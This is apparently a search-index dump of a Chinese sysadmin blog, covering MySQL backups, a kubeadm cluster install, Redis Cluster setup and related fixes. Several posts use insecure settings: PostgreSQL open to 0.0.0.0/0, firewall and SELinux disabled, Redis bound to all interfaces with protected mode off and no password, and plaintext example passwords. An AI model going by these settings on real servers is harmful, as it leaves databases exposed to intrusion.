0.0.0.0/0 md5 重启服务 systemctl restart postgresql-9.4.service ","date":"2019-11-21 15:07","objectID":"/post/1149/:0:0","tags":["postgresql","pgsql"],"title":"centos7使用yum安装postgresql9.4","uri":"/post/1149/"},{"categories":["系统服务","databases"],"content":"参考链接：http://blog.itpub.net/21374452/viewspace-2155266/ 解决方法： 1、提高允许的max_connection_errors数量： 进入Mysql数据库查看max_connection_errors： show variables like '%max_connect_errors%'; 修改max_connection_errors的数量为1000： set global max_connect_errors = 1000; 查看是否修改成功： show variables like '%max_connect_errors%'; 2、刷新hosts mysqladmin -uxxx -pxxx flush-hosts 也可以使用socket方式： mysqladmin -uxxx -pxxx --socket=/tmp/mysql.sock flush-hosts 默认情况下，my.cnf文件中可能没有此行，如果需要设置此数值，手动添加即可。 vi /etc/my.cnf max_connect_errors = 1000 配置说明： 当此值设置为10时，意味着如果某一客户端尝试连接此MySQL服务器，但是失败（如密码错误等等）10次，则MySQL会无条件强制阻止此客户端连接。 如果希望重置此计数器的值，则必须重启MySQL服务器或者执行 mysql\u003e flush hosts; 命令。 当这一客户端成功连接一次MySQL服务器后，针对此客户端的max_connect_errors会清零。 ","date":"2019-11-21 09:34","objectID":"/post/1144/:0:0","tags":["mysql"],"title":"mysql ERROR 1129 (HY000): Host 'xxxx' is blocked because of many connect","uri":"/post/1144/"},{"categories":["基础内容","常用命令"],"content":"ctrl + z 把当前正在执行的命令放到后台，并且暂停 jobs 查看后台运行的命令 bg 将一个在后台暂停的命令，变成继续执行，通过job命令查询编号，例如：bg 1 fg 将后台中的命令调回前台继续运行，通过job命令查询编号，例如：fg 1 ","date":"2019-11-16 23:45","objectID":"/post/1128/:0:0","tags":[],"title":"后台执行命令，ctrl + z、jobs、bg、fg","uri":"/post/1128/"},{"categories":["databases"],"content":"tmp目录没有权限导致 使用mongodb参数–nounixsocket mongod --config /etc/mongod.conf --nounixsocket --fork 或者修改tmp目录权限 如果无法修改，可以尝试chattr -i /tmp ","date":"2019-11-16 23:23","objectID":"/post/1125/:0:0","tags":["数据库"],"title":"mongodb Failed to set up listener: SocketException: Permission denied","uri":"/post/1125/"},{"categories":["kubernetes"],"content":"由于仓库需要认证的原因，所以需要k8s生成secret： #创建secret kubectl create secret docker-registry secret名称 --docker-server=仓库地址 --docker-username=用户名 --docker-password=密码 #通过获取data下的dockerconfigjson值做出反解，可以获取原始信息 kubectl get -n shjj secrets my-secret --output=\"jsonpath={.data.\\.dockerconfigjson}\" | base64 -d 应用到deployment资源yaml文件中： --- apiVersion: apps/v1 kind: Deployment metadata: name: app namespace: default spec: replicas: 2 selector: matchLabels: app: app template: metadata: labels: app: app spec: imagePullSecrets: - name: registry-secret containers: - name: app image: {image_name} ports: - containerPort: 9998 ","date":"2019-11-15 14:05","objectID":"/post/1121/:0:0","tags":["k8s"],"title":"docker可以pull镜像，但是k8s不能pull，配置私有仓库secret","uri":"/post/1121/"},{"categories":["虚拟化","docker"],"content":"dockerfile中添加如下内容即可： RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \\ \u0026\u0026 apk update \u0026\u0026 apk add tzdata \u0026\u0026 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ \u0026\u0026 echo \"Asia/Shanghai\" \u003e /etc/timezone \\ \u0026\u0026 apk del tzdata or FROM registry.cn-shanghai.aliyuncs.com/soulchild/oracle-jdk:8u212-debian RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime ENV TZ 'Asia/Shanghai' ADD ./target/xxx.jar / ","date":"2019-11-15 10:20","objectID":"/post/1118/:0:0","tags":["docker"],"title":"alpine镜像修改时区时间","uri":"/post/1118/"},{"categories":["kubernetes"],"content":"本文参考：https://www.kubernetes.org.cn/5462.html 1-6步在三台主机上都做配置 1.三台主机配置主机名 主机名 ip test-k8s-master 10.0.0.10 test-k8s-node1 10.0.0.11 test-k8s-node2 10.0.0.12   2.设置hosts解析 cat \u003c\u003cEOF \u003e\u003e/etc/hosts 10.0.0.10 test-k8s-master 10.0.0.11 test-k8s-node1 10.0.0.12 test-k8s-node2 EOF 3.关闭防火墙、selinux和swap。 systemctl stop firewalld systemctl disable firewalld setenforce 0 sed -i \"s/^SELINUX=enforcing/SELINUX=disabled/g\" /etc/selinux/config swapoff -a sed -i 's/.*swap.*/#\u0026/' /etc/fstab 4.配置内核参数，将桥接的IPv4流量传递到iptables的链 cat \u003e /etc/sysctl.d/k8s.conf \u003c\u003cEOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 EOF sysctl --system 5.配置k8s源和docker源 #k8s源 cat \u003c\u003cEOF \u003e /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/ enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF #docker源 wget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo 6.安装软件 6.1.安装docker yum install -y docker-ce-18.06.1.ce-3.el7 systemctl enable docker \u0026\u0026 systemctl start docker docker –v Docker version 18.06.1-ce, build e68fc7a 6.2修改文件驱动为systemd，和kubelet一致,修改docker存储路径 vim /etc/docker/daemon.json { \"exec-opts\": [\"native.cgroupdriver=systemd\"] , \"graph\": \"/data/docker\" } systemctl restart docker 6.3.安装kubeadm、kubelet、kubectl yum install -y kubelet-1.14.2-0 kubectl-1.14.2-0 kubeadm-1.14.2-0 systemctl enable kubelet kubeadm：快速安装k8s的工具 kubelet：master通过kubelet与node通信，并进行本节点Pod和容器生命周期的管理 kubectl：k8s集群管理工具 7.部署master节点 在master进行Kubernetes集群初始化。 kubeadm init --kubernetes-version=1.14.2 \\ --apiserver-advertise-address=10.0.0.10 \\ --image-repository registry.aliyuncs.com/google_containers \\ --service-cidr=10.1.0.0/16 \\ --pod-network-cidr=10.244.0.0/16 定义POD的网段为: 10.244.0.0/16， api server地址就是master本机IP地址。 这一步很关键，由于kubeadm 默认从官网k8s.grc.io下载所需镜像，国内无法访问，因此需要通过–image-repository指定阿里云镜像仓库地址 集群初始化成功后返回如下信息（需要记录下来）： Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \"kubectl apply -f [podnetwork].yaml\" with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 10.0.0.10:6443 --token da24z4.dg7gxgrer1ywvoyv \\ --discovery-token-ca-cert-hash sha256:748cdf603bce6057848493c2fcf8898b9ca37c16ac83129e5d7c47ad8d868528 按照提示执行： mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config 配置flannel网络： kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/a70459be0084506e4ec919aa1c114638878db11b/Documentation/kube-flannel.yml 8.部署node节点 执行上面记录的命令，使所有node节点加入Kubernetes集群 kubeadm join 10.0.0.10:6443 --token da24z4.dg7gxgrer1ywvoyv \\ --discovery-token-ca-cert-hash sha256:748cdf603bce6057848493c2fcf8898b9ca37c16ac83129e5d7c47ad8d868528 部署完node节点后验证： [root@test-k8s-master ~]# kubectl get nodes NAME STATUS ROLES AGE VERSION test-k8s-master Ready master 61m v1.14.2 test-k8s-node1 Ready \u003cnone\u003e 16m v1.14.2 test-k8s-node2 NotReady \u003cnone\u003e 16m v1.14.2 node2处于异常状态 排查： kubectl get all -o wide -n kube-system 发现node2节点的flannel镜像下载失败 pod/kube-flannel-ds-amd64-zhdcj 0/1 Init:ImagePullBackOff 查看pod详细信息： kubectl describe pod kube-flannel-ds-amd64-zhdcj -n kube-system 尝试手动pull镜像,不行就在docker hub上找一个了 在node2节点执行 docker pull quay.io/coreos/flannel:v0.11.0-amd64 pull下来等一小会node2就正常了 9.部署dashboard 1.下载yaml文件 wget https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml 使用如下命令或直接手动编辑kubernetes-dashboard.yaml文件，","date":"2019-11-10 16:04","objectID":"/post/1100/:0:0","tags":["k8s"],"title":"kubeadm部署kubernetes 1.14单主集群","uri":"/post/1100/"},{"categories":["其他"],"content":"source \u003c(命令 completion bash) 举例： source \u003c(kubectl completion bash) ","date":"2019-11-10 16:04","objectID":"/post/1109/:0:0","tags":[],"title":"table命令补齐失效","uri":"/post/1109/"},{"categories":["系统服务","databases"],"content":"增量备份仅针对于innodb引擎，对于myisam引擎依然是全备。 参数说明： –user：数据库用户名 –password：数据库密码 –socket：连接本地数据库时使用的套接字文件路径 –incremental：指定增量备份路径 –incremental-basedir：指定基于哪个备份做增量备份 –parallel=2：指定线程数量 –apply-log：指定xtrabackup_logfile文件，一般情况下,在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据 文件仍处理不一致状态。–apply-log的作用是通过回滚未提交的事务及同步已经提交的事务至数据文件使数据文件处于一致性状态。 –redo-only：只重做已提交的事务，不回滚未提交的事务 –incremental-dir：指定增量备份的目录 增量备份三个步骤：   1.全备（备份至 /data/backup/full/目录） innobackupex –defaults-file=/etc/my.cnf –user=root –password=123456 –socket=/tmp/mysql.sock /data/backup/full/ 2.第一次增量备份（基于全备） innobackupex –defaults-file=/etc/my.cnf –user=root –password=123456 –scoket=/tmp/mysql.sock –incremental /data/backup/incremental –incremental-basedir=/data/backup/full/2019-11-06_15-04-50 –parallel=2 3.第二次增量备份（基于上一次的增量备份） innobackupex –defaults-file=/etc/my.cnf –user=root –password=123456 –socket=/tmp/mysql.sock –incremental /data/backup/incremental/ –incremental-basedir=/data/backup/incremental/2019-11-06_15-19-32/ –parallel=2 增量备份的恢复：   1.应用事务日志的提交，不执行回滚 innobackupex --apply-log --redo-only /data/backup/full/2019-11-06_15-04-50/ 2.执行第一个增量备份的恢复 innobackupex --apply-log --redo-only /data/backup/full/2019-11-06_15-04-50/ --incremental-dir=/data/backup/incremental/2019-11-06_15-19-32/ 3.执行第二个增量备份的恢复（恢复最后一个增量备份的时候需要去掉redo-only参数） innobackupex --apply-log /data/backup/full/2019-11-06_15-04-50/ --incremental-dir=/data/backup/incremental/2019-11-06_15-32-05/ 4.把所有合在一起的完全备份整体进行一次apply操作，回滚未提交的数据： innobackupex --apply-log /data/backup/full/2019-11-06_15-04-50/ 5.将备份恢复到mysql数据文件目录 #模拟故障 mv /data/mysql{,2} systemctl stop mysqld #执行恢复，也可以执行cp -r命令手动恢复 innobackupex --defaults-file=/etc/my.cnf --copy-back --rsync /data/backup/full/2019-11-06_15-04-50/ #修改权限启动mysql chown -R mysql.mysql mysql systemctl start mysqld ","date":"2019-11-06 16:12","objectID":"/post/1083/:0:0","tags":["mysql"],"title":"使用xtrbackup(innobackupex)增量备份mysql(二)","uri":"/post/1083/"},{"categories":["基础内容"],"content":"获取变量长度： [root@soulchild ~]# content=soulchild [root@soulchild ~]# echo ${content} soulchild #加井号 [root@soulchild ~]# echo ${#content} 9 #使用expr [root@soulchild ~]# expr length ${content} 9 #使用awk [root@soulchild ~]# echo $content | awk '{print length}' 9 变量切片： #从第四个字符开始取值，取5个字符 [root@soulchild ~]# echo ${content:4:5} child ","date":"2019-11-04 18:49","objectID":"/post/1042/:0:0","tags":["shell"],"title":"获取变量长度和变量切片","uri":"/post/1042/"},{"categories":["系统服务","databases"],"content":"进入mysql命令行执行： #改密码 SET PASSWORD = PASSWORD(‘12345’); #设置密码永不过期 ALTER USER ‘root’@’localhost’ PASSWORD EXPIRE NEVER; #刷新权限表 flush privileges; ","date":"2019-11-04 18:48","objectID":"/post/1045/:0:0","tags":["mysql"],"title":"mysql修改密码和设置密码永不过期","uri":"/post/1045/"},{"categories":["系统服务","databases"],"content":" \u003cimg src=“images/f1aadf8d487782d921c206a6e2feb81e.png “f1aadf8d487782d921c206a6e2feb81e”” /\u003e 1 首先会启动一个xtrabackup_log后台检测的进程，实时检测mysql 事务日志redo的变化，一旦发现redo有新的日志写入，立刻将日志写入到日志文件xtrabackup_logfile中 2 复制innodb的数据文件和系统表空间文件idbdata1到对应的以默认时间戳为备份目录的地方。 3 复制结束后，执行flush table with read lock锁表操作。（MyISAM引擎由于不支持事务日志，所以会进行锁表。） 4 复制.frm，MYI，MYD文件。 5 并且在这一时刻获得binary log 的位置。 6 将表进行解锁unlock tables。 7 停止xtrabackup_log进程。 ","date":"2019-11-04 18:43","objectID":"/post/1067/:0:0","tags":["mysql"],"title":"Innobackupex(xtrabackup)完全备份Mysql过程","uri":"/post/1067/"},{"categories":["其他"],"content":"报错： Can’t locate Digest/MD5.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at - line 693. BEGIN failed–compilation aborted at - line 693. 解决方法： 安装perl-Digest-MD5 yum -y install perl-Digest-MD5 ","date":"2019-11-04 18:19","objectID":"/post/1063/:0:0","tags":["mysql"],"title":"使用xtrabackup报错Can't locate DigestMD5.pm in 。。。。。。。BEGIN failed--compilation aborted at - line 693.","uri":"/post/1063/"},{"categories":["系统服务","databases"],"content":"版本对应关系： mysql 5.1 – xtrabackup2.0 mysql5.6 –xtrabackup 2.2 mysql5.7 –xtrabackup2.4 mysql8.0 –xtrabackup8.0 xtrbackup工具下载安装： 2.4： https://www.percona.com/downloads/Percona-XtraBackup-2.4/LATEST/ 8.0： https://www.percona.com/downloads/Percona-XtraBackup-LATEST/ yum方式安装： wget https://www.percona.com/redir/downloads/percona-release/redhat/1.0-13/percona-release-1.0-13.noarch.rpm rpm -ivh percona-release-1.0-13.noarch.rpm yum install percona-xtrabackup-24 直接下载安装： wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.4/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm yum localinstall percona-xtrabackup-24-2.4.4-1.el7.x86_64.rpm innobackupex的常用选项： –default-files：可通过此选项指定其它的配置文件；但是使用时必须放于所有选项的最前面 –host：指定数据库服务器地址 –port：指定连接到数据库服务器的哪个端口 –socket：连接本地数据库时使用的套接字文件路径 –no-timestamp：在使用innobackupex进行备份时，可使用–no-timestamp选项来阻止命令自动创建一个以时间命名的目录；如此一来，innobackupex命令将会创建一个BACKUP-DIR目录来存储备份数据 –incremental：指定增量备份路径 –incremental-basedir：指定基于哪个备份做增量备份 –apply-log：指定xtrabackup_logfile文件，一般情况下,在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据 文件仍处理不一致状态。–apply-log的作用是通过回滚未提交的事务及同步已经提交的事务至数据文件使数据文件处于一致性状态。 –redo-only：只重做已提交的事务，不回滚未提交的事务 –use-memory：在“准备”阶段可提供多少内存以加速处理，默认是100M –copy-back：指定恢复数据目录，数据库服务器的数据目录 –compact：压缩备份 –stream={tar|xbstream}：对备份的数据流式化处理 –parallel=2：指定线程数 全备份：   1）创建备份用户 grant reload,lock tables,replication client,create tablespace,super on *.* to bakuser@'172.16.213.%' identified by '123456'; 2）进行全库备份 innobackupex --defaults-file=/etc/my.cnf --user=bakuser --password=123456 --socket=/tmp/mysql.sock /data/backup/full/ 使用innobakupex备份时，其会调用xtrabackup备份所有的InnoDB表，复制所有关于表结构定义的相关文件(.frm)、以及MyISAM、MERGE、CSV和ARCHIVE表的相关文件，同时还会备份触发器和数据库配置信息相关的文件。这些文件会被保存至一个以时间戳命名的目录中。 全备恢复：   1.停止数据库 systemctl stop mysqld 2.模拟故障 mv /data/mysql /data/mysql.bak 3.创建目录 mkdir -p /data/mysql 4.开始恢复 #innodb引擎需要执行，应用事务日志的提交和回滚 innobackupex –apply-log /data/backup/full/2019-11-04_19-09-48/ #恢复，也可以执行cp -r命令手动恢复 innobackupex –default-file=/etc/my.cnf –copy-back /data/backup/full/2019-11-04_19-09-48/ #赋予权限 chown -R mysql.mysql /data/mysql 指定库备份：   指定单库： –databases=wordpress 指定多库,使用空格分隔： –databases=“wordpress emlog” innobackupex --defaults-file=/etc/my.cnf --user=bakuser --password=123456 --socket=/tmp/mysql.sock --databases=wordpress /data/backup/blog/ 指定库恢复：   1.模拟故障 mysql\u003e delete from admin where id=3; 2.停止数据库 systemctl stop mysqld 3.innodb引擎需要执行，应用事务日志的提交和回滚 innobackupex –apply-log /data/backup/blog/2019-11-06_17-27-50 #恢复 cp -r /data/backup/blog/2019-11-06_17-27-50/emlog/ /data/mysql/ ","date":"2019-11-04 17:11","objectID":"/post/1049/:0:0","tags":["mysql"],"title":"使用xtrbackup(innobackupex)全量备份mysql(一)","uri":"/post/1049/"},{"categories":["基础内容","常用命令"],"content":"c： 显示完整的命令 d： 更改刷新频率 f： 增加或减少要显示的列(选中的会变成大写并加*号) F： 选择排序的列 h： 显示帮助画面 H： 显示线程 i： 忽略闲置和僵死进程 k： 通过给予一个PID和一个signal来终止一个进程。（默认signal为15。在安全模式中此命令被屏蔽） l: 显示平均负载以及启动时间（即显示影藏第一行） m： 显示内存信息 M： 根据内存资源使用大小进行排序 N： 按PID由高到低排列 o： 改变列显示的顺序 O： 选择排序的列，与F完全相同 P： 根据CPU资源使用大小进行排序 q： 退出top命令 r： 修改进程的nice值(优先级)。优先级默认为10，正值使优先级降低，反之则提高的优先级 s： 设置刷新频率（默认单位为秒，如有小数则换算成ms）。默认值是5s，输入0值则系统将不断刷新 S： 累计模式（把已完成或退出的子进程占用的CPU时间累计到父进程的MITE+ ） T： 根据进程使用CPU的累积时间排序 t： 显示进程和CPU状态信息（即显示影藏CPU行） u： 指定用户进程 W： 将当前设置写入~/.toprc文件，下次启动自动调用toprc文件的设置 \u003c： 向前翻页 \u003e： 向后翻页 ?： 显示帮助画面 1(数字1)： 显示每个CPU的详细情况 ","date":"2019-10-23 22:32","objectID":"/post/921/:0:0","tags":[],"title":"top命令快捷键","uri":"/post/921/"},{"categories":["其他"],"content":"java -jar -Dspring.cloud.inetutils.preferred-networks=192.168.20.123 ","date":"2019-10-23 22:32","objectID":"/post/1007/:0:0","tags":["java"],"title":"jar包指定ip注册eureka","uri":"/post/1007/"},{"categories":["系统服务"],"content":"1.安装redis yum install -y gcc-c++ wget http://download.redis.io/releases/redis-5.0.5.tar.gz tar xf redis-5.0.5.tar.gz -C /server cd /server/redis-5.0.5 make mkdir /usr/local/redis/{etc,log} -p make install PREFIX=/usr/local/redis cp redis.conf sentinel.conf /usr/local/redis/etc/ 修改环境变量 vim /etc/profile export PATH=$PATH:/usr/local/redis/bin source /etc/profile ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:1","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务"],"content":"2.redis模板配置文件 cat redis.conf.tpl \u003eEOF daemonize yes port 7000 dir /usr/local/redis dbfilename \"7000.rdb\" cluster-enabled yes cluster-config-file \"/usr/local/redis/etc/redis-cluster-7000.conf\" cluster-node-timeout 50000 # 这个参数为no 表示当集群中一个节点故障时,集群整体可用,只有存在故障节点的数据不能查询写入 cluster-require-full-coverage no client-output-buffer-limit normal 0 0 0 client-output-buffer-limit slave 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 bind 0.0.0.0 protected-mode no save \"\" appendonly no logfile \"/usr/local/redis/log/7000.log\" EOF client-output-buffer-limit 参数含义: Redis为了解决输出缓冲区消息大量堆积的隐患，设置了一些保护机制，主要采用两种限制措施： 大小限制，当某一客户端缓冲区超过设定值后直接关闭连接； 持续性限制，当某一客户端缓冲区持续一段时间占用过大空间时关闭连接。 后面三个参数分别表示 最大限制 最小限制 最小限制的持续时间 不同客户端有不同策略，策略如下： 对于普通客户端来说，限制为0，也就是不限制。因为普通客户端通常采用阻塞式的消息应答模式，何谓阻塞式呢？如：发送请求，等待返回，再发送请求，再等待返回。这种模式下，通常不会导致Redis服务器输出缓冲区的堆积膨胀； 对于Pub/Sub客户端（也就是发布/订阅模式），大小限制是32M，当输出缓冲区超过32M时，会关闭连接。持续性限制是，当客户端缓冲区大小持续60秒超过8M，则关闭客户端连接； 对于slave客户端来说，大小限制是256M，持续性限制是当客户端缓冲区大小持续60秒超过64M，则关闭客户端连接。 修改其他实例配置 for i in {7000..7005};do cp redis.conf.tpl redis-$i.conf;done for i in {7001..7005};do sed -i s#7000#$i# redis-$i.conf; done ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:2","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务"],"content":"3.启动所有实例 for i in {7000..7005};do redis-server redis-$i.conf; done ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:3","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务"],"content":"4.初始化集群 # 指定所有节点的地址，并且声明需要一个副本。最终结果是3主3从，每个主带一个从。 redis-cli --cluster create --cluster-replicas 1 10.23.40.38:7000 10.23.40.38:7001 10.23.40.38:7002 10.23.40.38:7003 10.23.40.38:7004 10.23.40.38:7005 ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:4","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务"],"content":"5.测试 [root@localhost etc]# redis-cli -c -p 7000 127.0.0.1:7000\u003e set name soulchild -\u003e Redirected to slot [5798] located at 10.23.40.38:7001 OK 10.23.40.38:7000\u003e get name -\u003e Redirected to slot [5798] located at 10.23.40.38:7001 \"soulchild\" # 停止7001主节点 redis-cli -p 7001 shutdown # 查看key，可以看到已经到7005节点了 [root@10-23-40-38 ~]# redis-cli -c -p 7000 127.0.0.1:7000\u003e get name -\u003e Redirected to slot [5798] located at 10.23.40.38:7005 \"soulchild\" ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:5","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务"],"content":"6.扩容节点 配置好后启动redis，添加到集群的方法如下 # 主节点身份加入 # 第一个地址是新节点地址。第二个地址是集群中已存在的节点，可以是集群中的任意一个节点 redis-cli --cluster add-node 10.23.40.38:7006 10.23.40.38:7001 # 从节点身份加入 # --cluster-slave表示从节点身份加入 # --cluster-master-id指定跟随哪个主节点，id可以通过cluster nodes获取 redis-cli --cluster add-node 10.23.40.38:7007 10.23.40.38:7001 --cluster-slave --cluster-master-id d67d00c2741f89ddee5a17f8c0715f29690b12c2 分配槽位 后加入集群的节点是没有分配槽位的，不会有数据写到新的节点，所以需要为新节点分配槽位 75807-1am09rzy4q5.png ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:6","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务"],"content":"7.删除节点 瓜分要删除节点的槽位 # 连接地址是集群中任意节点 # --cluster-from要瓜分哪个节点的槽位 # --cluster-to 要瓜分给谁 # --cluster-slots 要瓜分多少个 redis-cli --cluster reshard 10.23.40.38:7000 --cluster-from d67d00c2741f89ddee5a17f8c0715f29690b12c2 --cluster-to 79b6fe95c1284b8d868850e41ad01fc778030f5b --cluster-slots 1365 redis-cli --cluster reshard 10.23.40.38:7000 --cluster-from d67d00c2741f89ddee5a17f8c0715f29690b12c2 --cluster-to bc23087af4d92032f02bd096df6c663933b74938 --cluster-slots 1366 redis-cli --cluster reshard 10.23.40.38:7000 --cluster-from d67d00c2741f89ddee5a17f8c0715f29690b12c2 --cluster-to 7e333cb6b22bf0f81a6bdf72a217c9713bd319f5 --cluster-slots 1365 删除节点 # id通过cluster nodes获取 redis-cli --cluster del-node 10.23.40.38:7000 d67d00c2741f89ddee5a17f8c0715f29690b12c2 ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:7","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务"],"content":"8.常用命令 cluster相关命令: https://redis.io/commands/#cluster 集群节点状态 cluster nodes 显示格式： ip:port@cport … 集群状态 cluster info ","date":"2019-10-07 22:13","objectID":"/post/2761/:0:8","tags":["redis"],"title":"redis-cluster部署","uri":"/post/2761/"},{"categories":["系统服务","databases"],"content":"最新稳定版下载地址：http://download.redis.io/releases/redis-5.0.5.tar.gz ","date":"2019-10-07 12:02","objectID":"/post/976/:0:0","tags":["redis"],"title":"redis安装和基础调优","uri":"/post/976/"},{"categories":["系统服务","databases"],"content":"一、安装 yum install -y gcc-c++ wget http://download.redis.io/releases/redis-5.0.5.tar.gz tar xf redis-5.0.5.tar.gz -C /server cd /server/redis-5.0.5 make mkdir /usr/local/redis make install PREFIX=/usr/local/redis ","date":"2019-10-07 12:02","objectID":"/post/976/:0:1","tags":["redis"],"title":"redis安装和基础调优","uri":"/post/976/"},{"categories":["系统服务","databases"],"content":"配置文件 mkdir /usr/local/redis/{etc,log} cd /server/redis-5.0.5 cp redis.conf sentinel.conf /usr/local/redis/etc/ 常用二进制命令功能介绍： redis-server：Redis服务器的daemon启动程序 redis-cli：Redis命令行操作工具。也可以用telnet根据其纯文本协议来操作 redis-benchmark：Redis性能测试工具，测试Redis在当前系统下的读写性能 redis-check-aof：数据修复 redis-check-dump：检查导出工具 修改环境变量 vim /etc/profile export PATH=$PATH:/usr/local/redis/bin ","date":"2019-10-07 12:02","objectID":"/post/976/:0:2","tags":["redis"],"title":"redis安装和基础调优","uri":"/post/976/"},{"categories":["系统服务","databases"],"content":"二、配置基础参数调优 1.修改内核参数 echo vm.overcommit_memory=1 \u003e\u003e /etc/sysctl.conf sysctl -p 参数含义： 0，表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。 1，表示内核允许分配所有的物理内存，而不管当前的内存是否足够。 2，表示内核使用\"never overcommit\"策略来尝试防止任何内存过度使用 echo net.core.somaxconn=2048 \u003e\u003e /etc/sysctl.conf sysctl -p 修改TCP连接队列长度为2048，配置文件中tcp-backlog 2.修改配置文件 vim /usr/local/redis/etc/redis.conf #绑定IP，只能通过此IP连接 bind 10.0.0.237 #次值不能大于somaxconn的值 tcp-backlog 2048 #开启守护进程模式 daemonize yes #指定日志输出文件，默认在屏幕输出 logfile \"/usr/local/redis/log/access.log\" #关闭保护(不建议) #protected-mode no #设置密码（不建议） #requirepass 123 创建用户授权useradd -r redis \u0026\u0026 chown -R redis.redis /usr/local/redis/ 使用redis用户启动redis su redis -s /bin/bash -c \"/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf\" 停止或者 /usr/local/redis/bin/redis-cli shutown 有密码停止 /usr/local/redis/bin/redis-cli -a password shutown 使用kill kill -QUIT pid ","date":"2019-10-07 12:02","objectID":"/post/976/:0:3","tags":["redis"],"title":"redis安装和基础调优","uri":"/post/976/"},{"categories":["系统服务","databases"],"content":"使用systemd管理 redis-server vim /etc/systemd/system/redis.service [Unit] Description=Redis persistent key-value database After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf --supervised systemd Type=notify User=redis Group=redis [Install] WantedBy=multi-user.target redis-sentinel vim /etc/systemd/system/redis-sentinel.service [Unit] Description=Redis Sentinel After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-sentinel /usr/local/redis/etc/sentinel.conf --supervised systemd Type=notify #User=redis #Group=redis [Install] WantedBy=multi-user.target ","date":"2019-10-07 12:02","objectID":"/post/976/:0:4","tags":["redis"],"title":"redis安装和基础调优","uri":"/post/976/"},{"categories":["系统服务"],"content":"prefork   关键字：多进程 prefork模式可以算是很古老但是非常稳定的模式。Apache在启动之初，就预派生 fork一些子进程，然后等待请求进来，并且总是视图保持一些备用的子进程。之所以这样做，是为了减少频繁创建和销毁进程的开销。每个子进程中只有一个线程，在一个时间点内，只能处理一个请求。 在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。运行子进程的用户必须要对他所服务的内容有读取的权限，但是对服务内容之外的其他资源必须拥有尽可能少的权限。 \u003cimg src=“images/e3667f413a6de112a92d4be73ef5d157.png “e3667f413a6de112a92d4be73ef5d157\"” /\u003e \u003cimg src=“images/0c65dafcac2ab2c99e6a641152777553.png “0c65dafcac2ab2c99e6a641152777553\"” /\u003e 优点：成熟，兼容所有新老模块。进程之间完全独立，使得它非常稳定。同时，不需要担心线程安全的问题。（我们常用的mod_php，PHP的拓展不需要支持线程安全） 缺点：一个进程相对占用更多的系统资源，消耗更多的内存。而且，它并不擅长处理高并发请求，在这种场景下，它会将请求放进队列中，一直等到有可用进程，请求才会被处理。 httpd-mpm.conf 中的相关配置： \u003cIfModule mpm_prefork_module\u003e #服务器启动时建立的子进程数量 StartServers 5 #空闲子进程的最小数量，默认5；如果当前空闲子进程数少于MinSpareServers ，那么Apache将会产生新的子进程。此参数不要设的太大。 MinSpareServers 5 #空闲子进程的最大数量，默认10；如果当前有超过MaxSpareServers数量的空闲子进程，那么父进程会杀死多余的子进程。此参数也不需要设置太大，如果你将其设置比 MinSpareServers 小，Apache会自动将其修改为MinSpareServers+1。 MaxSpareServers 10 